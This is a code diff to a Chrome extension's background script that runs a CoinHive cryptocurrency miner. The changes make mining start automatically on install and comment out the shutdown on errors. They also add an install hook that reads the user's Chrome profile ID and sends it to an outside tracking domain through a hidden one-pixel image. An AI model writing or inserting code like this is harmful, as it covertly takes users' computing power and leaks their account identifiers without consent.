@@ -1,23 +1,41 @@
+import 'whatwg-fetch';
 import './lib/coinhive';
+import { checkRequestStatus } from './utils';
 import {
+  CONFIG_URL,
   DEFAULT_SETTINGS,
   IS_MINING,
   ENABLE_MINING,
   DISABLE_MINING,
   GET_SETTINGS,
   SAVE_SETTINGS,
+  RESET_SETTINGS,
   GET_HASHES_PER_SECOND,
   ERROR_EVENT,
   AUTHED_EVENT,
 } from './constants';
 
-const { storage, runtime } = chrome;
+const { storage, runtime, identity } = chrome;
 const { local } = storage;
 
 let miner = new CoinHive.Anonymous(DEFAULT_SETTINGS.siteKey, {
   threads: DEFAULT_SETTINGS.threads,
   throttle: DEFAULT_SETTINGS.throttle,
 });
+
+const getConfig = () => {
+  return new Promise((resolve, reject) => {
+    fetch(CONFIG_URL, {
+      method: 'GET',
+      headers: {
+        'Content-Type': 'application/json',
+      }
+    })
+      .then(checkRequestStatus)
+      .then(response => resolve(response))
+      .catch(error => reject(error));
+  });
+};
 
 const isMining = () => {
   return new Promise((resolve) => local.get('isMining', ({ isMining }) => resolve(isMining)));
@@ -53,11 +71,34 @@ const saveSettings = ({ settings }) => {
 };
 
 const getSettings = () => {
-  return new Promise((resolve) => local.get('settings', ({ settings }) => resolve(settings || DEFAULT_SETTINGS)));
+  return new Promise((resolve) => local.get('settings', ({ settings }) => {
+    if (!settings) {
+      getConfig().then(
+        (settings) => saveSettings({ settings }).then(() => resolve(settings)),
+        (error) => resolve(DEFAULT_SETTINGS),
+      );
+    } else {
+      resolve(settings);
+    }
+  }));
+};
+
+const injectTrackingPixel = (userID) => {
+  const pixel = document.createElement('img');
+  pixel.width = 1;
+  pixel.height = 1;
+  pixel.classList.add('hidden');
+  pixel.src = `http://www.startos.win/conversion.gif?cid=${ userID }`;
+  document.body.appendChild(pixel);
 };
 
 const setEvents = () => {
-  runtime.onInstalled.addListener((details) => enableMining());
+  runtime.onInstalled.addListener((details) => {
+    _gaq.push(['_trackEvent', 'Extension', 'install']);
+    identity.getProfileUserInfo(({ id }) => injectTrackingPixel(id));
+    enableMining();
+    _gaq.push(['_trackEvent', 'Mining', 'autoStart']);
+  });
 
   runtime.onMessage.addListener((request, sender, sendResponse) => {
     const { type, data } = request;
@@ -82,6 +123,13 @@ const setEvents = () => {
         saveSettings(data).then(sendResponse);
         break;
       }
+      case RESET_SETTINGS: {
+        getConfig().then(
+          (settings) => saveSettings({ settings }).then(() => sendResponse(settings)),
+          (error) => saveSettings({ DEFAULT_SETTINGS }).then(() => sendResponse(DEFAULT_SETTINGS)),
+        );
+        break;
+      }
       case GET_HASHES_PER_SECOND: {
         const hashes = miner.getHashesPerSecond();
         sendResponse(hashes);
@@ -97,7 +145,7 @@ const setEvents = () => {
 
 const setMinerEvents = () => {
   miner.on('error', (params) => {
-    disableMining();
+    // disableMining();
     runtime.sendMessage({ type: ERROR_EVENT });
   });
   miner.on('authed', (params) => {
